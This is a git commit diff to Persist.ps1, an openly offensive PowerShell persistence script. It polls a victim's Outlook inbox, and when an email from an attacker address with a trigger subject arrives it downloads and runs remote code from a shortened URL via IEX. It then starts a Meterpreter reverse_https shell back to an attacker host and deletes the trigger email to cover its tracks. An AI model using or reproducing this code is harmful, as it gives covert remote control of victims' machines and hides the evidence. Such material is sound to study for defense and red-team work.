11a97d381511c9f86e15e7e4db8573d47a7a1a80
enigma0x3 <matthew@webnelson.net>
2014-10-14 14:54:29 -0400

    Update Persist.ps1

--- Persist.ps1
+++ Persist.ps1
@@ -1,3 +1,6 @@
+$AttackerEmail = "ATTACKEREMAIL@EMAIL.COM"
+$TriggerWord = "EMAILSUBJECT"
+
 While($True){
 $olFolderInbox = 6
 $outlook = new-object -com outlook.application;
@@ -5,22 +8,27 @@ $ns = $outlook.GetNameSpace("MAPI");
 $inbox = $ns.GetDefaultFolder($olFolderInbox)
 $Emails = $inbox.items
 $Emails | foreach { 
-if($_.SenderEmailAddress -match "ATTACKEREMAIL@EMAIL.COM" -and $_.subject -match "TRIGGERTEXT")
+if($_.SenderEmailAddress -match $AttackerEmail -and $_.subject -match $TriggerWord)
 {Start-Job -ScriptBlock {$WebClientObject = New-Object Net.WebClient
 IEX $WebClientObject.DownloadString('http://goo.gl/yfLfQB')
-Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST xxx.xxx.x.xxx -LPORT 1111 -Force}
-
+Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST xxx.xxx.xx.xxx -LPORT 1111 -Force}
 }}
+
 $Emails | foreach { 
-if($_.SenderEmailAddress -match "ATTACKEREMAIL@EMAIL.COM" -and $_.subject -match "TRIGGERTEXT")
+if($_.SenderEmailAddress -match $AttackerEmail -and $_.subject -match $TriggerWord)
 {$OutlookFolders = $outlook.Session.Folders.Item(1).Folders
 $EmailInFolderToDelete = $outlook.Session.Folders.Item(1).Folders.Item("Inbox").Items
-$EmailToDelete = $EmailInFolderToDelete | Where-Object {$_.Subject -eq "TRIGGERTEXT" -and $_.SenderEmailAddress -eq "ATTACKEREMAIL@EMAIL.COM"}
+$EmailToDelete = $EmailInFolderToDelete | Where-Object {$_.Subject -eq $TriggerWord -and $_.SenderEmailAddress -eq $AttackerEmail}
 $EmailToDelete.Delete() }
-
 
 }
 #This determines how often the script checks in. Lower sleep time == more noise  
 Start-Sleep -s 10 
-  
+
+
+
+
+
 }
+
+
